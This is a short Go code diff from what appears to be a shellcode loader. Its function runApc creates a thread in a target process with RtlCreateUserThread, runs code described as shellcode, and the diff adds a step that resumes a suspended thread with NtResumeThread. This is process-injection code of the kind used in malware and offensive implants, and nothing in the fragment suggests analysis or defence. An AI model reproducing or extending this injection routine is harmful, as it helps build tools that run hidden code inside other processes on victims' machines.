@@ -42,8 +42,6 @@ func runApc(
 ) (*state, error) {
 	var e error
 
-	//nolint:godox // Not sure how to fix this right now
-	// FIXME why?
 	s.thread, e = w32.RtlCreateUserThread(s.proc, 0, s.l.suspend)
 	if e != nil {
 		return nil, errors.Newf("failed to create thread: %w", e)
@@ -51,6 +49,12 @@ func runApc(
 
 	if e = f(s.thread, s.addr); e != nil {
 		return nil, errors.Newf("failed to execute shellcode: %w", e)
+	}
+
+	if s.l.suspend {
+		if e = w32.NtResumeThread(s.thread); e != nil {
+			return nil, errors.Newf("failed to resume thread: %w", e)
+		}
 	}
 
 	return s, nil
